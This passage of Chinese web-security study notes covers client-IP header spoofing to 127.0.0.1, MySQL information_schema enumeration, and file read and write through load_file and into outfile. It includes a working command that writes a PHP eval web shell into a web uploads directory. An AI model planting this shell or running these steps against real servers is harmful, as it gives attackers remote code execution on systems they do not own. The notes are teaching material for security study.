...
- 通过该字段可以指定客户端的**ip**地址
- 通常都是将客户端地址伪造成`127.0.0.1`,从而实现本地访问。
...
<span style="font-size: 23px;">**information_schema元数据库**</span>

**information_schema**中比较重要的表：
- **schemata**：用于存放所有数据库的名字。
- **tables**：用于存放所有数据表的名字。
- **columns**：用于存放所有字段的名字。

**三个表中的重要字段：**
- **schemata**表中的**schema_name**字段，存放了所有数据库的名字。
- **tables**表中的**table_name**字段存放了表的名字，**table_schema**字段存放了数据库的名字。
- **columns**表中的**column_name**字段存放了字段的名字，**table_name**字段存放了表的名字，**table_schema**字段存放了数据库的名字。
...
+-------------------------------------+
| mysql load_file test success
       |
+-------------------------------------+
1 row in set (0.00 sec)
```

在MySQL中通过`into outfile`语句可以向系统中**写入**文件
- 必须要保证mysql用户对指定目录具有写入权限
- 文件路径必须用绝对路径

```bash
MariaDB [(none)]> select "<?php @eval($_REQUEST['pass']);?>" into outfile "/var/www/html/uploads/shell.php";
...
* **IP 地址**：标识网络上的某一台主机。
* **端口号 (Port Number)**：标识主机上运行的某个特定的应用程序。因为一台主机上可能运行着很多网络应用程序（比如 Web 服务器、邮件服务器等），[端口号](./networkpro.md#networking-port)就是用来区分这些应用程序的。
